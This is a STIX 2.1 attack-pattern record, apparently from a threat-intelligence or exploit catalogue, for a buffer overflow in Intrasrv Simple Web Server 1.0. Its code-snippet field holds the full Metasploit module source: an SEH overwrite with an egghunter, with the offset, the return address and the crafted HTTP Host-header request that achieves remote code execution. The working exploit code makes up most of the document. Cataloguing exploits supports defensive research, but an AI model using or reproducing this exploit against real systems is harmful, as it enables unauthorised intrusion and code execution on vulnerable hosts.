{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--9fa42264-608b-41f6-b154-f62d7d46622b",
    "created": "2024-08-14T16:54:31.582758Z",
    "modified": "2024-08-14T16:54:31.582762Z",
    "name": "\"Intrasrv 1.0 Buffer Overflow\"",
    "description": " This module exploits a boundary condition error in Intrasrv Simple Web Server 1.0. The web interface does not validate the boundaries of an HTTP request string prior to copying the data to an insufficiently sized buffer. Successful exploitation leads to arbitrary remote code execution in the context of the application.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/http/intrasrv_bof.rb",
            "external_id": "intrasrv_bof.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ManualRanking\n\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Exploit::Egghunter\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"Intrasrv 1.0 Buffer Overflow\",\n      'Description'    => %q{\n        This module exploits a boundary condition error in Intrasrv Simple Web\n        Server 1.0. The web interface does not validate the boundaries of an\n        HTTP request string prior to copying the data to an insufficiently sized\n        buffer. Successful exploitation leads to arbitrary remote code execution\n        in the context of the application.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'xis_one', # Discovery, PoC\n          'PsychoSpy <neinwechter[at]gmail.com>' # Metasploit\n        ],\n      'References'     =>\n        [\n          ['OSVDB', '94097'],\n          ['EDB','18397'],\n          ['BID','60229']\n        ],\n      'Payload'        =>\n        {\n          'Space' => 4660,\n          'StackAdjustment' => -3500,\n          'BadChars' => \"\\x00\\x0d\\x0a\"\n        },\n      'DefaultOptions'  =>\n        {\n          'EXITFUNC' => 'thread'\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          ['v1.0 - XP / Win7',\n            {\n              'Offset' => 1553,\n              'Ret'    => 0x004097dd #p/p/r - intrasrv.exe\n            }\n          ]\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2013-05-30',\n      'DefaultTarget'  => 0))\n\n      register_options(\n        [\n          OptPort.new('RPORT', [true, 'The remote port', 80])\n        ])\n  end\n\n  def check\n    begin\n      connect\n    rescue\n      print_error(\"Could not connect to target!\")\n      return Exploit::CheckCode::Safe\n    end\n    sock.put(\"GET / HTTP/1.0\\r\\n\\r\\n\")\n    res = sock.get_once\n\n    if res =~ /intrasrv 1\\.0/\n      return Exploit::CheckCode::Appears\n    else\n      return Exploit::CheckCode::Safe\n    end\n  end\n\n  def exploit\n    # setup egghunter\n    hunter,egg = generate_egghunter(payload.encoded, payload_badchars, {\n      :checksum=>true\n    })\n\n    # setup buffer\n    buf = rand_text(target['Offset']-126)         # junk to egghunter at jmp -128\n    buf << hunter                                 # egghunter\n    buf << rand_text(target['Offset']-buf.length) # more junk to offset\n    buf << \"\\xeb\\x80\" + rand_text(2)              # nseh - jmp -128 to egghunter\n    buf << [target.ret].pack(\"V*\")                # seh\n\n    # second last byte of payload/egg gets corrupted - pad 2 bytes\n    # so we don't corrupt the actual payload\n    egg << rand_text(2)\n\n    print_status(\"Sending buffer...\")\n    # Payload location is an issue, so we're using the tcp mixin\n    # instead of HttpClient here to maximize control over what's sent.\n    # (i.e. no additional headers to mess with the stack)\n    connect\n    sock.put(\"GET / HTTP/1.0\\r\\nHost: #{buf}\\r\\n\\r\\n#{egg}\\r\\n\\r\\n\")\n    disconnect\n  end\nend\n",
    "x_mitre_disclosure_date": "2013-05-30",
    "x_mitre_platforms": [
        "win'"
    ]
}